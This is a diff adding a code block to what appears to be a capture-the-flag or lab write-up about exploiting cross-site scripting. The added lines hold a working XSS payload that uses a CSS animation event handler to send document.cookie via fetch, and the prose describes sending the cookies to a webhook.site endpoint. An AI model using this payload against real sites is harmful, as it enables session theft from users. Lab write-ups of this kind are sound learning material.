@@ -66,6 +66,10 @@ The tools also help me generate the test payload:
 ![[Pasted image 20260208121153.png]]
 
 The payload worked so all I had to do left is setup a webhook using `webhook.site` and forge a new payload that is fetching the webhook using cookies as parameters.
+```html
+<style>@keyframes x{}</style>
+<h1 style="animation-name:x" onanimationstart="fetch('?c='+document.cookie)"></h1>
+```
 
 
 ---
